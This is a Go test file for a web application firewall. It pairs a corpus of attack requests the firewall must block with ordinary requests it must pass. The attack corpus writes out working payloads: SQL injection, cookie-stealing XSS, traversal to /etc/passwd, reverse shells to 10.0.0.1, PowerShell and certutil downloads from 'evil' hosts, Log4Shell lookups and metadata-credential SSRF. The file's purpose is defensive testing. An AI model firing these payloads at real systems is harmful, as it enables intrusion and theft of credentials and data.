package waf

import (
	"bytes"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strconv"
	"strings"
	"testing"

	"github.com/parthh37/nodehoster/internal/model"
)

// The corpora: requests that must be blocked at paranoia level 1 with the
// default threshold, and ordinary requests that must not score at all.

const browserUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"

// browser returns a request with the headers a browser sends.
func browser(method, target string, body string, contentType string) *http.Request {
	var r *http.Request
	if body != "" {
		r = httptest.NewRequest(method, target, strings.NewReader(body))
		r.Header.Set("Content-Type", contentType)
	} else {
		r = httptest.NewRequest(method, target, nil)
	}
	r.Header.Set("User-Agent", browserUA)
	r.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	r.Header.Set("Accept-Language", "en-GB,en;q=0.9,de;q=0.8")
	r.Header.Set("Accept-Encoding", "gzip, deflate, br, zstd")
	r.Header.Set("Sec-Ch-Ua", `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`)
	r.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
	r.Header.Set("Sec-Fetch-Site", "same-origin")
	r.Header.Set("Sec-Fetch-Mode", "navigate")
	r.Header.Set("Upgrade-Insecure-Requests", "1")
	r.Header.Set("Referer", "https://shop.example.com/products?category=shoes&sort=price_asc")
	r.Header.Set("Cookie", "_ga=GA1.1.1234567890.1726000000; _ga_ABC123=GS1.1.1726000000.3.1.1726000100.0.0.0; session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c; cookieconsent_status=dismiss; cart=%7B%22items%22%3A%5B%7B%22id%22%3A12%2C%22qty%22%3A2%7D%5D%7D; theme=dark; NHAffinity=abc.def")
	return r
}

func q(v string) string { return url.QueryEscape(v) }

func pl1() *Engine { return Compile(model.WAFConfig{Mode: model.WAFBlock}) }

var attacks = []struct {
	name string
	req  func() *http.Request
}{
	// SQL injection
	{"sqli tautology", func() *http.Request { return browser("GET", "/login?user="+q("admin' OR '1'='1"), "", "") }},
	{"sqli tautology double quotes", func() *http.Request { return browser("GET", "/login?user="+q(`" or ""="`), "", "") }},
	{"sqli or 1=1 comment", func() *http.Request { return browser("GET", "/item?id="+q("1' or 1=1-- -"), "", "") }},
	{"sqli numeric tautology", func() *http.Request { return browser("GET", "/item?id="+q("1 or 1=1"), "", "") }},
	{"sqli admin comment", func() *http.Request { return browser("GET", "/login?user="+q("admin'--"), "", "") }},
	{"sqli union select", func() *http.Request {
		return browser("GET", "/item?id="+q("-1 UNION SELECT username, password FROM users"), "", "")
	}},
	{"sqli union comment evasion", func() *http.Request { return browser("GET", "/item?id="+q("1/**/UNION/**/SELECT/**/1,2"), "", "") }},
	{"sqli union inline comment", func() *http.Request {
		return browser("GET", "/item?id="+q("1/*!50000UNION*//*!50000SELECT*/1,2,3"), "", "")
	}},
	{"sqli union double encoded", func() *http.Request {
		return browser("GET", "/item?id=1%2520UNION%2520SELECT%2520null%252Cnull", "", "")
	}},
	{"sqli stacked drop", func() *http.Request { return browser("GET", "/item?id="+q("1'; DROP TABLE users;--"), "", "") }},
	{"sqli sleep", func() *http.Request { return browser("GET", "/item?id="+q("1 AND SLEEP(5)"), "", "") }},
	{"sqli waitfor", func() *http.Request { return browser("GET", "/item?id="+q("1'; WAITFOR DELAY '0:0:5'--"), "", "") }},
	{"sqli information_schema", func() *http.Request {
		return browser("GET", "/item?id="+q("1 and (select count(*) from information_schema.tables)>0"), "", "")
	}},
	{"sqli xp_cmdshell", func() *http.Request {
		return browser("GET", "/item?id="+q("1; exec master..xp_cmdshell 'dir'"), "", "")
	}},
	{"sqli in json", func() *http.Request {
		return browser("POST", "/api/login", `{"username":"admin' or '1'='1","password":"x"}`, "application/json")
	}},
	{"sqli in form", func() *http.Request {
		return browser("POST", "/login", "username="+q("' OR 1=1 #")+"&password=x", "application/x-www-form-urlencoded")
	}},
	{"sqli in cookie", func() *http.Request {
		r := browser("GET", "/", "", "")
		r.Header.Set("Cookie", "id="+url.PathEscape("1' UNION SELECT password FROM users--"))
		return r
	}},
	{"sqli select star", func() *http.Request {
		return browser("GET", "/search?q="+q("x'); select * from users where ('a'='a"), "", "")
	}},
	{"sqli html entity quote", func() *http.Request { return browser("GET", "/item?id="+q("1&#39; or &#39;1&#39;=&#39;1"), "", "") }},
	{"sqli unicode quote", func() *http.Request { return browser("GET", "/item?id=1%u0027%20or%20%u00271%u0027=%u00271", "", "") }},
	{"nosql operator", func() *http.Request { return browser("GET", "/login?user[$ne]=x&password[$ne]=y", "", "") }},
	{"nosql json operator", func() *http.Request {
		return browser("POST", "/api/login", `{"username":{"$gt":""},"password":{"$gt":""}}`, "application/json")
	}},
	{"sqli extractvalue", func() *http.Request {
		return browser("GET", "/item?id="+q("1 and extractvalue(1,concat(0x7e,version()))"), "", "")
	}},

	// XSS
	{"xss script tag", func() *http.Request { return browser("GET", "/search?q="+q("<script>alert(1)</script>"), "", "") }},
	{"xss script mixed case", func() *http.Request { return browser("GET", "/search?q="+q("<ScRiPt>alert(1)</sCrIpT>"), "", "") }},
	{"xss img onerror", func() *http.Request { return browser("GET", "/search?q="+q(`<img src=x onerror=alert(1)>`), "", "") }},
	{"xss svg onload", func() *http.Request { return browser("GET", "/search?q="+q(`<svg/onload=alert(1)>`), "", "") }},
	{"xss attribute breakout", func() *http.Request {
		return browser("GET", "/search?q="+q(`" onfocus="alert(document.domain)" autofocus="`), "", "")
	}},
	{"xss javascript uri", func() *http.Request {
		return browser("GET", "/redirect?url="+q("javascript:alert(document.cookie)"), "", "")
	}},
	{"xss javascript uri tab", func() *http.Request { return browser("GET", "/redirect?url="+q("java\tscript:alert(1)"), "", "") }},
	{"xss entity encoded", func() *http.Request {
		return browser("GET", "/search?q="+q("&lt;script&gt;alert(1)&lt;/script&gt;"), "", "")
	}},
	{"xss double encoded", func() *http.Request {
		return browser("GET", "/search?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E", "", "")
	}},
	{"xss fullwidth", func() *http.Request {
		return browser("GET", "/search?q="+q("＜script＞alert(1)＜/script＞"), "", "")
	}},
	{"xss iframe", func() *http.Request {
		return browser("GET", "/search?q="+q(`<iframe src="https://evil.example/x"></iframe>`), "", "")
	}},
	{"xss document.cookie", func() *http.Request {
		return browser("POST", "/comment", `{"text":"x\"><img src=1 onerror=fetch('//evil/'+document.cookie)>"}`, "application/json")
	}},
	{"xss in referer", func() *http.Request {
		r := browser("GET", "/", "", "")
		r.Header.Set("Referer", "https://example.com/?q=<script>alert(1)</script>")
		return r
	}},
	{"xss in path", func() *http.Request { return browser("GET", "/search/%3Cscript%3Ealert(1)%3C/script%3E", "", "") }},
	{"xss json unicode escape", func() *http.Request {
		return browser("POST", "/api/comment", `{"body":"\u003cscript\u003ealert(1)\u003c/script\u003e"}`, "application/json")
	}},
	{"xss data uri", func() *http.Request {
		return browser("GET", "/view?src="+q("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="), "", "")
	}},

	// Path traversal / LFI
	{"traversal in query", func() *http.Request { return browser("GET", "/download?file="+q("../../../../etc/passwd"), "", "") }},
	{"traversal windows", func() *http.Request { return browser("GET", "/download?file="+q(`..\..\..\windows\win.ini`), "", "") }},
	{"traversal encoded path", func() *http.Request { return browser("GET", "/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "", "") }},
	{"traversal double encoded", func() *http.Request {
		return browser("GET", "/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd", "", "")
	}},
	{"traversal overlong", func() *http.Request { return browser("GET", "/download?file=..%c0%af..%c0%afetc%c0%afpasswd", "", "") }},
	{"traversal unicode", func() *http.Request {
		return browser("GET", "/download?file=%uff0e%uff0e%u2215%uff0e%uff0e%u2215boot.ini", "", "")
	}},
	{"etc passwd", func() *http.Request { return browser("GET", "/view?page="+q("/etc/passwd"), "", "") }},
	{"proc self environ", func() *http.Request { return browser("GET", "/view?page="+q("/proc/self/environ"), "", "") }},
	{"dotenv", func() *http.Request { return browser("GET", "/.env", "", "") }},
	{"git config", func() *http.Request { return browser("GET", "/.git/config", "", "") }},
	{"web.config", func() *http.Request { return browser("GET", "/web.config", "", "") }},
	{"ntfs ads", func() *http.Request { return browser("GET", "/index.js::$DATA", "", "") }},
	{"traversal file name", func() *http.Request {
		return multipartReq("/upload", map[string]string{"title": "x"}, "file", "../../../app/server.js", "evil")
	}},

	// RFI
	{"rfi php wrapper", func() *http.Request {
		return browser("GET", "/index?page="+q("php://filter/convert.base64-encode/resource=index.php"), "", "")
	}},
	{"rfi data wrapper", func() *http.Request {
		return browser("GET", "/index?page="+q("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg=="), "", "")
	}},

	// OS command injection
	{"rce semicolon", func() *http.Request { return browser("GET", "/ping?host="+q("127.0.0.1; cat /etc/passwd"), "", "") }},
	{"rce pipe", func() *http.Request {
		return browser("GET", "/ping?host="+q("127.0.0.1 | nc 10.0.0.1 4444 -e /bin/sh"), "", "")
	}},
	{"rce and and", func() *http.Request { return browser("GET", "/ping?host="+q("x && whoami"), "", "") }},
	{"rce subshell", func() *http.Request { return browser("GET", "/ping?host="+q("$(whoami)"), "", "") }},
	{"rce ifs", func() *http.Request { return browser("GET", "/ping?host="+q("x;cat${IFS}/etc/passwd"), "", "") }},
	{"rce dev tcp", func() *http.Request {
		return browser("GET", "/x?c="+q("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"), "", "")
	}},
	{"rce powershell", func() *http.Request {
		return browser("GET", "/x?c="+q("& powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIA"), "", "")
	}},
	{"rce cmd", func() *http.Request { return browser("GET", "/x?c="+q("| cmd.exe /c dir c:\\"), "", "") }},
	{"rce certutil", func() *http.Request {
		return browser("GET", "/x?c="+q("certutil -urlcache -split -f http://evil/x.exe x.exe"), "", "")
	}},
	{"rce download string", func() *http.Request {
		return browser("POST", "/x", "cmd="+q("IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')"), "application/x-www-form-urlencoded")
	}},
	{"shellshock", func() *http.Request {
		r := browser("GET", "/cgi-bin/status", "", "")
		r.Header.Set("User-Agent", "() { :; }; /bin/bash -c 'cat /etc/passwd'")
		return r
	}},
	{"shellshock other header", func() *http.Request {
		r := browser("GET", "/", "", "")
		r.Header.Set("X-Custom", "() { ignored; }; echo; /usr/bin/id")
		return r
	}},

	// PHP
	{"php open tag", func() *http.Request {
		return browser("POST", "/comment", "text="+q("<?php system($_GET['c']); ?>"), "application/x-www-form-urlencoded")
	}},
	{"php upload", func() *http.Request {
		return multipartReq("/upload", map[string]string{"title": "avatar"}, "file", "shell.php", "GIF89a")
	}},
	{"php object injection", func() *http.Request {
		return browser("POST", "/x", "data="+q(`O:8:"Evil_Obj":1:{s:4:"exec";s:2:"id";}`), "application/x-www-form-urlencoded")
	}},
	{"php function", func() *http.Request { return browser("GET", "/x?a="+q("shell_exec('id')"), "", "") }},

	// Node.js / JavaScript
	{"prototype pollution query", func() *http.Request { return browser("GET", "/api/settings?__proto__[isAdmin]=true", "", "") }},
	{"prototype pollution json", func() *http.Request {
		return browser("POST", "/api/merge", `{"user":{"name":"x"},"__proto__":{"isAdmin":true}}`, "application/json")
	}},
	{"constructor prototype", func() *http.Request { return browser("GET", "/api/x?constructor[prototype][admin]=1", "", "") }},
	{"child_process", func() *http.Request {
		return browser("POST", "/api/eval", `{"code":"require('child_process').exec('calc')"}`, "application/json")
	}},
	{"node-serialize", func() *http.Request {
		return browser("POST", "/api/profile", `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}`, "application/json")
	}},
	{"ssti", func() *http.Request {
		return browser("GET", "/hello?name="+q("{{constructor.constructor('return process')()}}"), "", "")
	}},
	{"ssti jinja", func() *http.Request {
		return browser("GET", "/hello?name="+q("{{''.__class__.__mro__[1].__subclasses__()}}"), "", "")
	}},
	{"ssrf metadata", func() *http.Request {
		return browser("GET", "/fetch?url="+q("http://169.254.169.254/latest/meta-data/iam/security-credentials/"), "", "")
	}},

	// Java
	{"log4shell", func() *http.Request {
		r := browser("GET", "/", "", "")
		r.Header.Set("User-Agent", "${jndi:ldap://evil.example/a}")
		return r
	}},
	{"log4shell obfuscated", func() *http.Request {
		r := browser("GET", "/", "", "")
		r.Header.Set("X-Api-Version", "${${lower:j}${::-n}di:${lower:l}dap://evil.example/a}")
		return r
	}},
	{"log4shell in query", func() *http.Request { return browser("GET", "/?q="+q("${jndi:rmi://evil.example/x}"), "", "") }},
	{"ognl content type", func() *http.Request {
		r := browser("POST", "/upload.action", "x", "text/plain")
		r.Header.Set("Content-Type", "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}")
		return r
	}},
	{"spring4shell", func() *http.Request {
		return browser("POST", "/app", "class.module.classLoader.resources.context.parent.pipeline.first.pattern=x", "application/x-www-form-urlencoded")
	}},
	{"java runtime", func() *http.Request {
		return browser("GET", "/x?e="+q("T(java.lang.Runtime).getRuntime().exec('id')"), "", "")
	}},

	// Scanners and protocol
	{"sqlmap ua", func() *http.Request {
		r := browser("GET", "/", "", "")
		r.Header.Set("User-Agent", "sqlmap/1.7.2#stable (https://sqlmap.org)")
		return r
	}},
	{"nikto ua", func() *http.Request {
		r := browser("GET", "/", "", "")
		r.Header.Set("User-Agent", "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)")
		return r
	}},
	{"acunetix header", func() *http.Request {
		r := browser("GET", "/", "", "")
		r.Header.Set("Acunetix-Product", "WVS/13.0")
		return r
	}},
	{"trace method", func() *http.Request { return browser("TRACE", "/", "", "") }},
	{"null byte", func() *http.Request { return browser("GET", "/download?file=report.pdf%00.js", "", "") }},
}

var benign = []struct {
	name string
	req  func() *http.Request
}{
	{"home page", func() *http.Request { return browser("GET", "/", "", "") }},
	{"static asset", func() *http.Request { return browser("GET", "/assets/index-4f3a2b1c.js", "", "") }},
	{"well-known", func() *http.Request { return browser("GET", "/.well-known/acme-challenge/abc123", "", "") }},
	{"search O'Brien", func() *http.Request { return browser("GET", "/search?q="+q("O'Brien"), "", "") }},
	{"search select a plan", func() *http.Request {
		return browser("GET", "/help?q="+q("how do I select a plan from the list"), "", "")
	}},
	{"search drop table", func() *http.Request { return browser("GET", "/shop?q="+q("drop table for sale"), "", "") }},
	{"search union", func() *http.Request { return browser("GET", "/news?q="+q("union selected new leader"), "", "") }},
	{"search quotes", func() *http.Request { return browser("GET", "/search?q="+q(`"new york" or "boston"`), "", "") }},
	{"search apostrophes", func() *http.Request { return browser("GET", "/search?q="+q("rock 'n' roll and don't stop"), "", "") }},
	{"search and or", func() *http.Request { return browser("GET", "/search?q="+q("cats and dogs or birds"), "", "") }},
	{"search javascript book", func() *http.Request { return browser("GET", "/books?q="+q("JavaScript: The Good Parts"), "", "") }},
	{"search ampersand", func() *http.Request { return browser("GET", "/search?q="+q("Tom & Jerry; cat food"), "", "") }},
	{"search percent", func() *http.Request { return browser("GET", "/search?q="+q("100% cotton, 50% off"), "", "") }},
	{"search price", func() *http.Request { return browser("GET", "/search?q="+q("shoes < $100 and > $50"), "", "") }},
	{"search email", func() *http.Request { return browser("GET", "/users?email="+q("o'neil+test@example.com"), "", "") }},
	{"pagination", func() *http.Request {
		return browser("GET", "/products?page=2&per_page=50&sort=-created_at&filter[status]=active&filter[tags][]=new&include=author,comments", "", "")
	}},
	{"utm", func() *http.Request {
		return browser("GET", "/?utm_source=newsletter&utm_medium=email&utm_campaign=autumn_sale-2026&fbclid=IwAR2xyz_ABC-def", "", "")
	}},
	{"oauth callback", func() *http.Request {
		return browser("GET", "/auth/callback?code=4%2F0AfJohXn8kQ&state=eyJyIjoiL2Rhc2hib2FyZCJ9&scope=openid%20email%20profile", "", "")
	}},
	{"relative return url", func() *http.Request { return browser("GET", "/login?returnUrl="+q("/account/orders?id=12"), "", "") }},
	{"absolute return url", func() *http.Request {
		return browser("GET", "/login?next="+q("https://shop.example.com/cart?step=2"), "", "")
	}},
	{"markdown comment", func() *http.Request {
		body := `{"body":"## Update\n\nI tried **both** options:\n\n- use ` + "`npm ci`" + ` instead of ` + "`npm install`" + `\n- set ` + "`NODE_ENV=production`" + `\n\n| id | name | status |\n|----|------|--------|\n| 1 | api | ok |\n\n> It's fine -- really. Don't worry; it works.\n\nSee [the docs](https://example.com/docs?a=1&b=2) <3","draft":false}`
		return browser("POST", "/api/posts/12/comments", body, "application/json")
	}},
	{"html-ish comment", func() *http.Request {
		body := "comment=" + q("I <3 this! <b>Great</b> product, 5/5. Use <em>size M</em> & wash at 30°. a < b > c. <!-- not a tag -->")
		return browser("POST", "/reviews", body, "application/x-www-form-urlencoded")
	}},
	{"harmless link", func() *http.Request {
		return browser("POST", "/api/profile", `{"bio":"Find me at <a href=\"https://example.com/online=yes\">my site</a>","website":"https://example.com"}`, "application/json")
	}},
	{"graphql", func() *http.Request {
		body := `{"operationName":"GetUser","variables":{"id":"123","first":10,"after":null},"query":"query GetUser($id: ID!, $first: Int, $after: String) { user(id: $id) { id name email posts(first: $first, after: $after) { edges { node { id title createdAt } } pageInfo { hasNextPage endCursor } } } }"}`
		return browser("POST", "/graphql", body, "application/json")
	}},
	{"graphql mutation", func() *http.Request {
		body := `{"query":"mutation CreatePost($input: PostInput!) { createPost(input: $input) { id } }","variables":{"input":{"title":"Select the best plan","body":"Compare plans and select one from the table below. It's easy -- and free!","tags":["pricing","help"]}}}`
		return browser("POST", "/graphql", body, "application/json")
	}},
	{"json api", func() *http.Request {
		body := `{"order":{"id":"ord_123","items":[{"sku":"A-1","qty":2,"price":19.99},{"sku":"B-2","qty":1,"price":5}],"shipping":{"name":"Siobhán O'Connor","street":"12 Main St.","city":"Dublin","notes":"Leave at door; ring bell 2x"},"coupon":null,"gift":true}}`
		return browser("POST", "/api/orders", body, "application/json")
	}},
	{"base64 blob", func() *http.Request {
		body := `{"filename":"avatar.png","data":"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="}`
		return browser("POST", "/api/avatar", body, "application/json")
	}},
	{"jwt bearer", func() *http.Request {
		r := browser("GET", "/api/me", "", "")
		r.Header.Set("Authorization", "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxIn0.c2lnbmF0dXJl")
		return r
	}},
	{"login form", func() *http.Request {
		return browser("POST", "/login", "username=jane.doe%40example.com&password=P%40ss%27w0rd%3B--%23&remember=on&_csrf=abc123", "application/x-www-form-urlencoded")
	}},
	{"file upload", func() *http.Request {
		return multipartReq("/upload", map[string]string{"title": "Quarterly report (Q3)", "description": "Numbers & charts; see page 2."}, "file", "Q3 report - final (1).pdf", "%PDF-1.7 binary \x00\x01\x02 <script> ignored")
	}},
	{"image upload", func() *http.Request {
		return multipartReq("/upload", map[string]string{}, "photo", "IMG_2024.JPG", "\xff\xd8\xff\xe0 binary")
	}},
	{"typical cookies", func() *http.Request {
		r := browser("GET", "/account", "", "")
		r.Header.Set("Cookie", `_gid=GA1.2.987654321.1726000000; _fbp=fb.1.1726000000000.123456789; OptanonConsent=isGPCEnabled=0&datestamp=Tue+Sep+24+2026+10%3A00%3A00+GMT%2B0100&version=202401.1.0&groups=C0001%3A1%2CC0002%3A0; ASP.NET_SessionId=abc123def456; connect.sid=s%3AabcDEF123.xyz%2Fsig%2Bvalue; __Host-next-auth.csrf-token=abc%7Cdef; prefs={"lang":"en","tz":"Europe/London"}`)
		return r
	}},
	{"api client", func() *http.Request {
		r := httptest.NewRequest("GET", "/api/v1/status", nil)
		r.Header.Set("User-Agent", "curl/8.4.0")
		r.Header.Set("Accept", "*/*")
		return r
	}},
	{"websocket upgrade", func() *http.Request {
		r := browser("GET", "/socket.io/?EIO=4&transport=websocket&sid=Abc123_-xyz", "", "")
		r.Header.Set("Connection", "Upgrade")
		r.Header.Set("Upgrade", "websocket")
		r.Header.Set("Sec-WebSocket-Key", "dGhlIHNhbXBsZSBub25jZQ==")
		return r
	}},
	{"code search", func() *http.Request { return browser("GET", "/docs/search?q="+q("array.filter(x => x > 1)"), "", "") }},
	{"path with dots", func() *http.Request { return browser("GET", "/files/archive..old/v1.2.3/readme.md", "", "") }},
	{"ellipsis", func() *http.Request { return browser("GET", "/search?q="+q("wait... what?"), "", "") }},
	{"cjk", func() *http.Request { return browser("GET", "/search?q="+q("東京 ラーメン & 寿司"), "", "") }},
	{"emoji json", func() *http.Request {
		return browser("POST", "/api/chat", `{"message":"On my way 🚗 — see you at 5pm! Don't forget the \"select\" pack ;)"}`, "application/json")
	}},
	{"csv text body", func() *http.Request {
		return browser("POST", "/import", "id,name,email\n1,O'Brien,ob@example.com\n2,\"Smith, J\",js@example.com\n", "text/csv")
	}},
	{"slack-like webhook", func() *http.Request {
		body := `{"text":"Deploy finished: <https://ci.example.com/build/42|build 42> by @jane","attachments":[{"color":"#36a64f","fields":[{"title":"Env","value":"prod","short":true}]}]}`
		return browser("POST", "/hooks/notify", body, "application/json")
	}},
	{"sql tutorial title", func() *http.Request {
		return browser("POST", "/api/posts", `{"title":"Joins explained","body":"A join combines rows, like picking a table and an index for speed."}`, "application/json")
	}},
	{"date range", func() *http.Request {
		return browser("GET", "/reports?from=2026-01-01&to=2026-03-31&tz=Europe%2FLondon&fields=id,total,created_at", "", "")
	}},
	{"hash router", func() *http.Request { return browser("GET", "/app/?redirect=%2Fdashboard%23section-2", "", "") }},
	{"windows path arg", func() *http.Request { return browser("GET", "/browse?dir="+q(`C:\Users\Public\Documents`), "", "") }},
	{"crawler and browser user agents", func() *http.Request {
		r := browser("GET", "/", "", "")
		r.Header.Set("User-Agent", "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
		return r
	}},
	{"iphone safari", func() *http.Request {
		r := browser("GET", "/", "", "")
		r.Header.Set("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1")
		r.Header.Set("Referer", "https://www.google.com/search?q=select+union+plan+or+drop+table+%27best%27")
		return r
	}},
	{"facebook preview", func() *http.Request {
		r := browser("GET", "/blog/post-1", "", "")
		r.Header.Set("User-Agent", "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)")
		return r
	}},
	{"stripe webhook", func() *http.Request {
		body := `{"id":"evt_1","object":"event","type":"checkout.session.completed","data":{"object":{"id":"cs_test_a1","customer_details":{"email":"o'hara@example.com","name":"Seán O'Hara"},"metadata":{"order":"1042; gift wrap"},"url":null}}}`
		r := browser("POST", "/webhooks/stripe", body, "application/json")
		r.Header.Set("Stripe-Signature", "t=1726000000,v1=5257a869e7ecebeda32affa62cdca3fa51cad7e77a0e56ff536d0ce8e108d8bd")
		return r
	}},
	{"github webhook", func() *http.Request {
		body := `{"ref":"refs/heads/main","head_commit":{"message":"Fix login (#42)\n\n- handle 'remember me'\n- don't crash on empty passwords; add tests","author":{"name":"dev"}}}`
		r := browser("POST", "/hooks/deploy/abc", body, "application/json")
		r.Header.Set("X-GitHub-Event", "push")
		r.Header.Set("X-Hub-Signature-256", "sha256=0123456789abcdef")
		return r
	}},
	{"search engine query terms", func() *http.Request {
		return browser("GET", "/search?q="+q("how to select from a dropdown and update the page")+"&lang=en-GB", "", "")
	}},
	{"product filter", func() *http.Request {
		return browser("GET", "/api/products?where[price][lte]=100&where[brand][in]=acme,globex&order=price:desc", "", "")
	}},
	{"long text field", func() *http.Request {
		text := strings.Repeat("The quick brown fox jumps over the lazy dog; it's a classic. Order by Friday -- or not! ", 400)
		return browser("POST", "/api/notes", `{"note":`+strconv.Quote(text)+`}`, "application/json")
	}},
	{"options preflight", func() *http.Request {
		r := httptest.NewRequest("OPTIONS", "/api/items", nil)
		r.Header.Set("Origin", "https://app.example.com")
		r.Header.Set("Access-Control-Request-Method", "PUT")
		r.Header.Set("Access-Control-Request-Headers", "content-type,authorization")
		r.Header.Set("User-Agent", browserUA)
		return r
	}},
}

func multipartReq(target string, fields map[string]string, fileField, fileName, content string) *http.Request {
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	for k, v := range fields {
		mw.WriteField(k, v)
	}
	h := make(map[string][]string)
	h["Content-Disposition"] = []string{`form-data; name="` + fileField + `"; filename="` + fileName + `"`}
	h["Content-Type"] = []string{"application/octet-stream"}
	w, _ := mw.CreatePart(h)
	w.Write([]byte(content))
	mw.Close()
	return browser("POST", target, buf.String(), mw.FormDataContentType())
}

func TestAttackCorpusBlockedAtParanoia1(t *testing.T) {
	e := pl1()
	for _, tc := range attacks {
		res := e.Inspect(tc.req())
		if !res.Exceeded() {
			t.Errorf("%s: score %d, not blocked; matches %+v", tc.name, res.Score, res.Matches)
		}
	}
}

func TestBenignCorpusCleanAtParanoia1(t *testing.T) {
	e := pl1()
	for _, tc := range benign {
		res := e.Inspect(tc.req())
		if res.Score != 0 {
			t.Errorf("%s: score %d; matches %+v", tc.name, res.Score, res.Matches)
		}
	}
}

// At paranoia level 2 the benign corpus may score, but should mostly stay
// below the threshold: this guards against rules that belong higher.
func TestBenignCorpusParanoia2(t *testing.T) {
	e := Compile(model.WAFConfig{Mode: model.WAFBlock, ParanoiaLevel: 2})
	blocked := 0
	for _, tc := range benign {
		if res := e.Inspect(tc.req()); res.Exceeded() {
			blocked++
			t.Logf("PL2 blocks %s: %+v", tc.name, res.Matches)
		}
	}
	if blocked > len(benign)/5 {
		t.Errorf("paranoia 2 blocks %d of %d benign requests", blocked, len(benign))
	}
}
